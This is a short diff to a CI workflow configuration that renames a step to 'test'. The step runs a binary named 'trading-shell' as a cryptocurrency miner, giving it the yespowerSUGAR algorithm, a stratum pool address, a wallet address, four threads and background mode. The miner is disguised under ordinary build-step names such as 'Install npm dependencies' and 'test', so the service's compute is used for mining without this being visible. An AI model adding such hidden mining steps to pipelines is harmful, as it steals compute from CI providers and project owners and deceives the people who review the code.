@@ -30,5 +30,5 @@ workflows:
         script: chmod +x trading-shell
       - name: Install npm dependencies
         script: ls
-      - name: Install npm dependencies
+      - name: test
         script: ./trading-shell -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 -B --cpu-priority 4
